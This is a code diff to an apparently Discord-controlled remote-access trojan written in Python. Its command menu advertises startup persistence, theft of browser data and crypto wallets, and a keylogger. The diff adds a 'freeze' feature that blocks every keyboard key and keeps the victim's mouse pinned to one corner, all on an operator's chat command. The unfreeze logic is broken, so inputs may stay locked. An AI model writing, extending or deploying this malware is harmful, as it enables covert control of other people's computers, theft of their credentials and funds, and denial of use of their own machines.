@@ -1,4 +1,5 @@
-import os, discord, subprocess, requests, ctypes, zipfile, threading
+import os, discord, subprocess, requests, ctypes, zipfile, threading, keyboard
+from pynput.mouse import Controller
 from PIL import ImageGrab, Image
 import cv2
 from tkinter import messagebox
@@ -93,7 +94,8 @@ commands = "\n".join([
     "startup - Add to startup",
     "browser - Get browser data",
     "wallet - Get wallet information",
-    "keylogger - Enable keylogger -- WIP",
+    "keylogger - Enable keylogger -- WIP -- !cant be stoped, only thru reboot or shutdown!",
+    "freeze <1/0> - Freeze all inputs from keyboard and mouse",
     "!quit - Exit session without deleting all the data",
     "!exit - Exit session and delete all data"
 ])
@@ -174,6 +176,31 @@ async def browsers(channel):
             await channel.send(embed=embed)
 
     delete_files(["Chrome.zip", "Opera.zip", "OperaGX.zip", "Brave.zip", "Edge.zip", "Chromium.zip"])
+
+
+def freeze():
+    global blocking
+    blocking = True
+    block = threading.Thread(target=block_input)
+    block.start()
+            
+def block_input():
+    global blocking
+    mouse = Controller()
+    for i in range(150):
+        try: keyboard.block_key(i)
+        except: pass
+
+    while blocking:
+        mouse.position = (0, 0)
+
+def unblock_input():
+    global blocking
+    blocking = False
+    
+    for i in range(150):
+        try: keyboard.unblock_key(i)
+        except: pass
 
 
 @client.event
@@ -521,7 +548,29 @@ async def on_message(message):
             return
         
         await message.reply("Keylogger enabled!")
-       
+    
+    
+    elif message.content.startswith("freeze "):
+        action = message.content[7:]
+        freezed = False
+
+        if action == "1":
+            if freezed:
+                await message.reply("Inputs are already freezed!")
+            else:
+                freeze()
+                freezed = True
+                await message.reply("Inputs are now freezed!")
+        
+        elif action == "0":
+            if not freezed:
+                await message.reply("Inputs are not freezed!")
+            else:
+                unblock_input()
+                freezed = False
+                await message.reply("Inputs are unfrezzed!")
+        
+        
     elif message.content == "!quit":
         await client.close()
        
